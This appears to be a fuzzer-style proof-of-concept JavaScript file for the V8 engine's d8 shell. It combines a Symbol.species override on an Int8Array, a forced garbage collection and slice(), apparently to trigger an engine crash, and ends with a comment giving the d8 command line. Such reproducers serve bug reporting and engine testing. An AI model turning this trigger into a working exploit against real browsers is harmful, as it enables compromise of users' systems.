const v2 = new Int8Array();  
function f3(a4, a5) {  
    const v8 = this.__proto__.constructor;  
    const o19 = {  
        o(a10, a11, a12, a13) {  
            try {  
                ArrayBuffer(a11, this);  
            } catch(e15) {  
                gc();  
                e15.stack;  
            }  
            return Int8Array;  
        },  
    };  
    o19.o();  
    return v8();  
}  
Object.defineProperty(f3, Symbol.species, { configurable: true, value: f3 });  
v2.constructor = f3;  
v2.slice();  
//.\d8.exe --expose-gc --future --always-turbofan --turboshaft-future poc.js